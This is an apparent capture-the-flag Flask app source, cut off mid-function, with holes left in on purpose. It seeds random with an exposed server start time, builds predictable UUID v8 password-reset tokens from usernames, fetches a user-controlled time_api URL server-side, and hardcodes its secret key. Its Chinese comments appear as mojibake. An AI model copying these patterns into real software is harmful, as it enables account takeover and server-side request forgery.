<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># -*- encoding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">@File    :   app.py
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">@Time    :   2066/07/05 19:20:29
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">@Author  :   Ekko exec inc. æŸç‰›é©¬ç¨‹åºå‘˜ 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> wraps
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> secrets <span style="color:#f92672">import</span> token_urlsafe
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_sqlalchemy <span style="color:#f92672">import</span> SQLAlchemy
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> werkzeug.security <span style="color:#f92672">import</span> generate_password_hash, check_password_hash
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template, redirect, url_for, request, flash, session
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SERVER_START_TIME <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># æ¬¸æˆ‘è‰¹è¿™ä¸¤è¡Œä»£ç æµ‹è¯•ç”¨çš„å¿˜è®°åˆ äº†ï¼Œæ¬¸ç®—äº†éƒ½å‘å¸ƒäº†ï¼Œæˆ‘ä»¬éƒ½åœ¨ç”¨åŠ›åœ°æ´»ç€ï¼Œè·Ÿæˆ‘çš„ä¸‹ç­è¯´å»å§ã€‚</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># åæ­£æ•´ä¸ªç¨‹åºæ²¡æœ‰ä¸€ä¸ªåœ°æ–¹ç”¨åˆ°randomåº“ã€‚åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span>random<span style="color:#f92672">.</span>seed(SERVER_START_TIME)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>admin_super_strong_password <span style="color:#f92672">=</span> token_urlsafe()
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;your-secret-key-here&#39;</span>
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SQLALCHEMY_DATABASE_URI&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sqlite:///site.db&#39;</span>
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>db <span style="color:#f92672">=</span> SQLAlchemy(app)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>(db<span style="color:#f92672">.</span>Model):
</span></span><span style="display:flex;"><span>    id <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>Integer, primary_key<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>String(<span style="color:#ae81ff">20</span>), unique<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, nullable<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    email <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>String(<span style="color:#ae81ff">120</span>), unique<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, nullable<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>String(<span style="color:#ae81ff">60</span>), nullable<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    is_admin <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>Boolean, default<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    time_api <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>String(<span style="color:#ae81ff">200</span>), default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://api.uuni.cn//api/time&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PasswordResetToken</span>(db<span style="color:#f92672">.</span>Model):
</span></span><span style="display:flex;"><span>    id <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>Integer, primary_key<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    user_id <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>Integer, db<span style="color:#f92672">.</span>ForeignKey(<span style="color:#e6db74">&#39;user.id&#39;</span>), nullable<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>String(<span style="color:#ae81ff">36</span>), unique<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, nullable<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    used <span style="color:#f92672">=</span> db<span style="color:#f92672">.</span>Column(db<span style="color:#f92672">.</span>Boolean, default<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">padding</span>(input_string):
</span></span><span style="display:flex;"><span>    byte_string <span style="color:#f92672">=</span> input_string<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(byte_string) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">6</span>: byte_string <span style="color:#f92672">=</span> byte_string[:<span style="color:#ae81ff">6</span>]
</span></span><span style="display:flex;"><span>    padded_byte_string <span style="color:#f92672">=</span> byte_string<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">6</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    padded_int <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(padded_byte_string, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> padded_int
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> app<span style="color:#f92672">.</span>app_context():
</span></span><span style="display:flex;"><span>    db<span style="color:#f92672">.</span>create_all()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>)<span style="color:#f92672">.</span>first():
</span></span><span style="display:flex;"><span>        admin <span style="color:#f92672">=</span> User(
</span></span><span style="display:flex;"><span>            username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span>,
</span></span><span style="display:flex;"><span>            email<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin@example.com&#39;</span>,
</span></span><span style="display:flex;"><span>            password<span style="color:#f92672">=</span>generate_password_hash(admin_super_strong_password),
</span></span><span style="display:flex;"><span>            is_admin<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>        db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>add(admin)
</span></span><span style="display:flex;"><span>        db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>commit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_required</span>(f):
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@wraps</span>(f)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decorated_function</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;user_id&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> session:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;è¯·ç™»å½•&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decorated_function
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin_required</span>(f):
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@wraps</span>(f)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decorated_function</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;user_id&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> session:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;è¯·ç™»å½•&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>get(session[<span style="color:#e6db74">&#39;user_id&#39;</span>])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user<span style="color:#f92672">.</span>is_admin:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;ä½ ä¸æ˜¯admin&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;home&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> decorated_function
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_time_api</span>():
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>get(session[<span style="color:#e6db74">&#39;user_id&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(user<span style="color:#f92672">.</span>time_api)
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>        datetime_str <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;date&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> datetime_str:
</span></span><span style="display:flex;"><span>            print(datetime_str)
</span></span><span style="display:flex;"><span>            current_time <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>fromisoformat(datetime_str)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> current_time<span style="color:#f92672">.</span>year <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2066</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;home.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/server_info&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">server_info</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;server_start_time&#39;</span>: SERVER_START_TIME,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;current_time&#39;</span>: time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/register&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>)
</span></span><span style="display:flex;"><span>        email <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;email&#39;</span>)
</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>)
</span></span><span style="display:flex;"><span>        confirm_password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;confirm_password&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> password <span style="color:#f92672">!=</span> confirm_password:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;å¯†ç é”™è¯¯&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;register&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        existing_user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(username<span style="color:#f92672">=</span>username)<span style="color:#f92672">.</span>first()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> existing_user:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;å·²ç»å­˜åœ¨è¿™ä¸ªç”¨æˆ·äº†&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;register&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        existing_email <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(email<span style="color:#f92672">=</span>email)<span style="color:#f92672">.</span>first()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> existing_email:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;è¿™ä¸ªé‚®ç®±å·²ç»è¢«æ³¨å†Œäº†&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;register&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        hashed_password <span style="color:#f92672">=</span> generate_password_hash(password)
</span></span><span style="display:flex;"><span>        new_user <span style="color:#f92672">=</span> User(username<span style="color:#f92672">=</span>username, email<span style="color:#f92672">=</span>email, password<span style="color:#f92672">=</span>hashed_password)
</span></span><span style="display:flex;"><span>        db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>add(new_user)
</span></span><span style="display:flex;"><span>        db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>commit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        flash(<span style="color:#e6db74">&#39;æ³¨å†ŒæˆåŠŸï¼Œè¯·ç™»å½•&#39;</span>, <span style="color:#e6db74">&#39;success&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;register.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>)
</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;password&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(username<span style="color:#f92672">=</span>username)<span style="color:#f92672">.</span>first()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> user <span style="color:#f92672">and</span> check_password_hash(user<span style="color:#f92672">.</span>password, password):
</span></span><span style="display:flex;"><span>            session[<span style="color:#e6db74">&#39;user_id&#39;</span>] <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>id
</span></span><span style="display:flex;"><span>            session[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>username
</span></span><span style="display:flex;"><span>            session[<span style="color:#e6db74">&#39;is_admin&#39;</span>] <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>is_admin
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;ç™»é™†æˆåŠŸï¼Œæ¬¢è¿!&#39;</span>, <span style="color:#e6db74">&#39;success&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;dashboard&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯!&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;login&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;login.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/logout&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">.</span>clear()
</span></span><span style="display:flex;"><span>    flash(<span style="color:#e6db74">&#39;æˆåŠŸç™»å‡º&#39;</span>, <span style="color:#e6db74">&#39;info&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;home&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/dashboard&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dashboard</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;dashboard.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/forgot_password&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forgot_password</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        email <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;email&#39;</span>)
</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(email<span style="color:#f92672">=</span>email)<span style="color:#f92672">.</span>first()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> user:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># é€‰å“ªä¸ªUUIDç‰ˆæœ¬å¥½å‘¢ï¼Œå¥½å¤´ç–¼ &gt;_&lt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># UUID v8å§ï¼Œçœ‹èµ·æ¥ç‰ˆæœ¬æ¯”è¾ƒæ–°</span>
</span></span><span style="display:flex;"><span>            token <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid8(a<span style="color:#f92672">=</span>padding(user<span style="color:#f92672">.</span>username))) <span style="color:#75715e"># å¯ä»¥è‡ªå®šä¹‰å‚æ•°å—åŸæ¥ï¼Œé‚£æŠŠusernameæ”¾è¿›å»å§</span>
</span></span><span style="display:flex;"><span>            reset_token <span style="color:#f92672">=</span> PasswordResetToken(user_id<span style="color:#f92672">=</span>user<span style="color:#f92672">.</span>id, token<span style="color:#f92672">=</span>token)
</span></span><span style="display:flex;"><span>            db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>add(reset_token)
</span></span><span style="display:flex;"><span>            db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>commit()
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># TODOï¼šå†™ä¸€ä¸ªSMTPæœåŠ¡æŠŠtokenå‘å‡ºå»</span>
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;å¯†ç æ¢å¤tokenå·²ç»å‘é€ï¼Œè¯·æ£€æŸ¥ä½ çš„é‚®ç®±&#39;</span>, <span style="color:#e6db74">&#39;info&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;reset_password&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;æ²¡æœ‰æ‰¾åˆ°è¯¥é‚®ç®±å¯¹åº”çš„æ³¨å†Œè´¦æˆ·&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;forgot_password&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;forgot_password.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/reset_password&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reset_password</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;token&#39;</span>)
</span></span><span style="display:flex;"><span>        new_password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;new_password&#39;</span>)
</span></span><span style="display:flex;"><span>        confirm_password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;confirm_password&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> new_password <span style="color:#f92672">!=</span> confirm_password:
</span></span><span style="display:flex;"><span>            flash(<span style="color:#e6db74">&#39;å¯†ç ä¸åŒ¹é…&#39;</span>, <span style="color:#e6db74">&#39;danger&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#39;reset_password&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        reset_token <span style="color:#f92672">=</span> PasswordResetToken<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter_by(token<span style="color:#f92672">=</span>token, used<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)<span style="color:#f92672">.</span>first()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> reset_token:
</span></span><span style="display:flex;"><span>            user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>get(reset_token<span style="color:#f92672">.</span>user_id)
</span></span><span style="display:flex;"><span>            user<span style="color:#f92672">.</span>password <span style="color:#f92672">=</span> generate_password_hash(new_password)
</span></span><span style="display:flex;"><span>            reset_token<span style="color:#f92672">.</span>used <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>            db<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>commit()
